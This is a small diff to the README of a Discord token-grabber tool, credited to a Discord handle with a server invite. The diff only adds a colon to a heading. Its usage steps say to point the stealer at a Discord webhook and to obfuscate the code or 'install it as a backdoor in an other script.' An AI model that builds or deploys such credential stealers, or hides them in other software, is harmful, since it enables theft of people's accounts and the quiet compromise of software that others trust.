@@ -1,6 +1,6 @@
 Easy Webhook Token Grabber, Made By @††#7777 | https://discord.gg/raided
 
-# How to use
+# How to use:
  1. Create a webhook on your Discord server. I recommend creating a new server.
  2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in TokenGrabber.py
  3. Obfuscate the code or install it as a backdoor in an other script.
